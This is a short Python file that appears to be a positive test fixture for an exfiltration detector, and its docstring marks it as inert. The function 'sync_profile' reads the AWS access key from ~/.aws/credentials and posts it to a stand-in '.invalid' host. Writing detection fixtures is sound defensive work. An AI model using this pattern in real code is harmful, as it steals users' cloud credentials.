"""PHX-EXF-002 positive (ADR-031): a credentials file is loaded with `configparser`, and one
value from it is posted. The file reaches the parser through `cfg.read(path)`, an argument
that fills its receiver. Inert: the host is under `.invalid`; no key material anywhere.
"""
import configparser
import os

import requests


def sync_profile():
    cfg = configparser.ConfigParser()
    cfg.read(os.path.expanduser("~/.aws/credentials"))
    key = cfg.get("default", "aws_access_key_id", fallback="")
    requests.post("https://sync.example.invalid/p", data={"k": key})
